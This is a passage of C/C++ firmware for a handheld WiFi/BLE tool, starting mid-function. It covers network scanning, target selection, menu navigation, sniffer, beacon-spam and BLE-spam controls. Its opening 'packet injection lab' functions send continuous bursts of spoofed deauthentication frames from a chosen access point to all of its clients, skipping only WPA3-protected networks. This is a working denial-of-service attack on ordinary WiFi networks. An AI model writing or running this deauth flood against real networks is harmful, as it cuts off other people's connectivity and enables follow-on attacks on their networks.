      delay(LAB_DEAUTH_TX_GAP_MS);
    }

    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    if (!rearmLabWifi(target.channel)) {
      uiDrawStatus("WiFi rearm failed");
      ledFlashRed(2, 100);
      buzzerError();
      delay(900);
      return anySent;
    }
  }
}

bool runPacketInjectionLab() {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - TX blocked");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  wifi_off();
  delay(200);
  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    uiDrawStatus("WiFi init failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }
  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
  delay(200);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uiDrawTxCounter(sentCount);

  while (true) {
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
      anySent = anySent || sent;
      if (sent) {
        sentCount++;
        ledFlashGreen(1, 20);
        buzzerClick();
      } else {
        ledFlashRed(1, 20);
      }

      uiDrawTxCounter(sentCount);
      delay(LAB_DEAUTH_TX_GAP_MS);
    }

    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    if (!rearmLabWifi(target.channel)) {
      uiDrawStatus("WiFi rearm failed");
      ledFlashRed(2, 100);
      buzzerError();
      delay(900);
      return anySent;
    }
  }
}

bool rearmLabWifi(uint8_t channel) {
  uiDrawStatus("Rearming WiFi...");
  wifi_off();
  delay(220);

  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    uiDrawStatus("WiFi on failed");
    delay(300);
    return false;
  }
  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work

  delay(240);
  uiDrawStatus("Setting channel...");
  if (wifi_set_channel(channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel failed");
    delay(120);
    return false;
  }

  delay(90);
  return true;
}

bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
  labInjectionStoppedByUser = true;
  uiDrawStatus("Stopped");

  delay(700);
  waitForLabButtonsReleased();
  return anySent;
}

void returnToDeauthCaller(UiState returnState) {
  if (returnState == UI_LAB_MENU) { drawLabMenu(); return; }
  if (returnState == UI_NETWORK_DETAILS) {
    uiState = UI_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    return;
  }
  drawWifiMenu();
}

bool labStopRequested() {
  if (!okPressed()) return false;
  delay(220);
  return okPressed();
}

void waitForLabButtonsReleased() {
  while (okPressed() || navPressed()) delay(20);
}

bool isInjectionBlockedSecurity(uint32_t security) {
  return security == RTW_SECURITY_WPA3_AES_PSK ||
         security == RTW_SECURITY_WPA2_WPA3_MIXED ||
         security == RTW_SECURITY_WPA2_AES_CMAC;
}

bool parseMacAddress(const char *text, uint8_t mac[6]) {
  if (strlen(text) != 17) return false;
  for (uint8_t i = 0; i < 6; i++) {
    int high = hexValue(text[i * 3]);
    int low  = hexValue(text[i * 3 + 1]);
    if (high < 0 || low < 0) return false;
    mac[i] = (high << 4) | low;
    if (i < 5 && text[i * 3 + 2] != ':') return false;
  }
  return true;
}

int hexValue(char value) {
  if (value >= '0' && value <= '9') return value - '0';
  if (value >= 'A' && value <= 'F') return value - 'A' + 10;
  if (value >= 'a' && value <= 'f') return value - 'a' + 10;
  return -1;
}

// ─────────────────────────────────────────────────────────────
//  Target helpers
// ─────────────────────────────────────────────────────────────

void runTargetRefresh() {
  if (!targetHasSelection()) {
    showPlaceholder("Re-scan", "No target set yet");
    return;
  }

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  ledYellowOn();
  uiDrawStatus("Scanning for target...");

  bool scanOk   = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  ledYellowOff();

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand    = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), true);
    ledFlashGreen(1, 120);
    buzzerScanDone();
  } else {
    labStatsAdd(false, NULL);
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), false);
    ledFlashRed(1, 120);
  }

  labStatsPrintToSerial();
  delay(250);
}

bool sameTarget(uint8_t networkIndex) {
  if (!targetHasSelection()) return false;
  return strcmp(targetGet().bssid, wifiScannerNetwork(networkIndex).bssid) == 0;
}

void showPlaceholder(const char *title, const char *message) {
  uiState = UI_PLACEHOLDER;
  uiDrawStatus(title);
  delay(500);
  uiDrawStatus(message);
}

// ─────────────────────────────────────────────────────────────
//  WiFi scan
// ─────────────────────────────────────────────────────────────

void runScan() {
  setLedMode(LED_MODE_SCANNING);
  uiDrawStatus("Scanning...");

  selectedNetwork = 0;
  listTop = 0;
  uiState = UI_WIFI_MENU;

  if (!wifiScannerScan()) {
    setLedMode(LED_MODE_IDLE);
    ledFlashRed(2, 100);
    buzzerError();
    uiDrawStatus("Scan failed");
    delay(1200);
    drawWifiMenu();
    return;
  }

  // Scan end: 3 green blink
  ledAllOff();
  ledFlashGreen(3, 100);
  setLedMode(LED_MODE_IDLE);
  
  buzzerScanDone();

  selectedBand = wifiScannerCountBand(5) > 0 ? 5 : 2;
  uiState = UI_BAND_MENU;
  uiDrawBandMenu(selectedBand);
}

// ─────────────────────────────────────────────────────────────
//  Index / scroll helpers
// ─────────────────────────────────────────────────────────────

uint8_t nextIndex(uint8_t current, uint8_t count) {
  return (current + 1) % count;
}

uint8_t previousIndex(uint8_t current, uint8_t count) {
  return current == 0 ? count - 1 : current - 1;
}

uint8_t nextBandOption(uint8_t current) {
  return current == 5 ? 2 : 5;
}

void moveSelection(int delta) {
  if (wifiScannerCount() == 0) {
    uiDrawStatus("OK to scan");
    delay(250);
    return;
  }

  int bandCount = wifiScannerCountBand(selectedBand);
  if (bandCount == 0) {
    selectedNetwork = -1;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(180);
    return;
  }

  if (delta > 0) {
    if (selectedNetwork == -1) {
      for (int i = 0; i < (int)wifiScannerCount(); i++) {
        if (wifiScannerNetworkInBand(i, selectedBand)) { selectedNetwork = i; break; }
      }
    } else {
      int nxt = -2;
      for (int i = selectedNetwork + 1; i < (int)wifiScannerCount(); i++) {
        if (wifiScannerNetworkInBand(i, selectedBand)) { nxt = i; break; }
      }
      selectedNetwork = (nxt == -2) ? -1 : nxt;
    }
  } else {
    if (selectedNetwork == -1) {
      for (int i = (int)wifiScannerCount() - 1; i >= 0; i--) {
        if (wifiScannerNetworkInBand(i, selectedBand)) { selectedNetwork = i; break; }
      }
    } else {
      int prv = -2;
      for (int i = selectedNetwork - 1; i >= 0; i--) {
        if (wifiScannerNetworkInBand(i, selectedBand)) { prv = i; break; }
      }
      selectedNetwork = (prv == -2) ? -1 : prv;
    }
  }

  normalizeListTop();
  uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
  delay(150);
}

void selectFirstNetworkInBand() {
  selectedNetwork = -1;
  listTop = 0;
  for (uint8_t i = 0; i < wifiScannerCount(); i++) {
    if (wifiScannerNetworkInBand(i, selectedBand)) {
      selectedNetwork = i;
      listTop = i;
      break;
    }
  }
  uiState = UI_NETWORK_LIST;
}

void normalizeListTop() {
  if (selectedNetwork == -1) {
    for (uint8_t i = 0; i < wifiScannerCount(); i++) {
      if (wifiScannerNetworkInBand(i, selectedBand)) { listTop = i; return; }
    }
    listTop = 0;
    return;
  }
  if (selectedNetwork < listTop) { listTop = selectedNetwork; return; }
  uint8_t rows = 0;
  for (uint8_t i = listTop; i < wifiScannerCount(); i++) {
    if (!wifiScannerNetworkInBand(i, selectedBand)) continue;
    rows++;
    if ((int)i == selectedNetwork) return;
    if (rows >= 4) { listTop = selectedNetwork; return; }
  }
}

// ─────────────────────────────────────────────────────────────
//  BLE list navigation
// ─────────────────────────────────────────────────────────────

void moveBleSelection(int delta) {
  int total = (int)bleCount();
  if (total == 0) { selectedBleDevice = -1; return; }

  if (delta > 0) {
    if (selectedBleDevice < total - 1) selectedBleDevice++;
    else                               selectedBleDevice = -1;
  } else {
    if (selectedBleDevice == -1) selectedBleDevice = total - 1;
    else if (selectedBleDevice > 0) selectedBleDevice--;
    else                            selectedBleDevice = -1;
  }

  if (selectedBleDevice >= 0 && selectedBleDevice < bleListTop)
    bleListTop = selectedBleDevice;
  if (selectedBleDevice >= bleListTop + 4)
    bleListTop = selectedBleDevice - 3;
  if (bleListTop < 0) bleListTop = 0;

  uiRefreshBleList(selectedBleDevice, bleListTop);
  delay(150);
}

// ─────────────────────────────────────────────────────────────
//  Exit / close helpers
// ─────────────────────────────────────────────────────────────

void closeBleAnalyzer() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void closeBleScanList() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void exitBeaconSpam() {
  beaconSpamStop();
  ledYellowOff();
  drawWifiMenu();
}

void exitBleSpam() {
  bleSpamStop();
  ledYellowOff();
  drawBleMenu();
}

void exitWifiAnalyzer() {
  sniffStop();
  ledYellowOff();
  drawWifiMenu();
}

void exitSniffer() {
  sniffStop();
  ledYellowOff();
  drawWifiMenu();
}

void startSniffer(uint8_t band) {
  if (sniffStart(band)) {
    uiState = UI_SNIFFER;
    uiDrawSniffer(sniffGetStats());
    ledYellowOn();
  } else {
    showPlaceholder("Sniffer", "Failed to start");
    buzzerError();
  }
}





